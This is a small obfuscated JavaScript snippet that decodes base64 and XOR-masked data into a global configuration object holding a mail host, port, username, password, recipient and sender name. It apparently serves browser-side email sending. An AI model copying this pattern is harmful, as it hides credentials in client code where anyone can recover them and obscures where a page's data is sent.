(function(){
var x=atob("WOcz2poN7qgucOSw6McYI8cz5FkQcrYnNLuzIIChX2BKvmws1FXSfniI1iFh7ooFuHjoLNPRLPONLfNAY9EFz9tCvlNB90Oys/tRk5taIp8q1xzYfNoYbeGeJ8tt2WRyAUpg3Feuhc0absm2CUBx5m+RYTIe/N4BxXJf3PKf1MdJg4JgMplI9ssruHu8Bg6UOQ3gNj6A1VA=");
var y=[[116, 202, 38, 223, 166, 231, 10, 89, 198, 178, 29, 6, 65, 87, 186, 184, 93, 111, 174, 54, 108, 112, 180, 21, 44, 142], [158, 34, 185, 180, 152, 152, 153, 112, 159, 160, 83, 194, 111, 228, 197, 52, 150, 5, 8, 175, 211, 35, 189, 66, 192, 49], [219, 149, 193, 6, 75, 200, 4, 142, 197, 88, 237, 67, 85, 239, 204, 54, 3, 227, 75, 250, 189, 192, 123, 156, 161, 74], [15, 113, 247, 35, 245, 2, 155, 126, 160, 200, 106, 51, 109, 129, 33, 149, 113, 113, 33, 80, 126, 207, 91, 148, 52, 40], [245, 196, 90, 113, 252, 199, 255, 85, 208, 8, 211, 2, 70, 163, 181, 95, 146, 99, 92, 237, 242, 137, 217, 35, 176, 122], [102, 164, 225, 109, 228, 78, 68, 140, 52, 23, 196, 72, 90, 214, 115, 123, 251, 6, 60, 190, 146, 232, 144, 155, 166, 177]];
var z=[];for(var i=0;i<y.length;i++){for(var j=0;j<y[i].length;j++){z.push(y[i][j]^((i*17+j*11+73)%256));}}
var r="";for(var i=0;i<x.length;i++){r+=String.fromCharCode(x.charCodeAt(i)^z[i]);}
var d=JSON.parse(atob(r));
var _x=atob("hQUBNTqSW8VL+IXU2N+I4A==");
var _f=[[218,94,92,112,13,190,96,242],[4,170,177,235,225,231,142,237],[176,94,85,66,202,32,230,191],[29,62,108,247,22,188,135,2],[50,82,117,33,126,33,19,210],[239,10,248,60,95,240,25,128]];
var _k=[];for(var _i=0;_i<_f.length;_i++){for(var _j=0;_j<_f[_i].length;_j++){_k.push(_f[_i][_j]^((_i*13+_j*7+42)%256));}}
var _p="";for(var _i=0;_i<_x.length;_i++){var _c=_x.charCodeAt(_i)^_k[_i%_k.length];if(_c===0)break;_p+=String.fromCharCode(_c);}
window.EC={
host:d.h,
port:d.p,
username:d.u,
password:_p,
to:d.t,
from_name:d.f
};
})();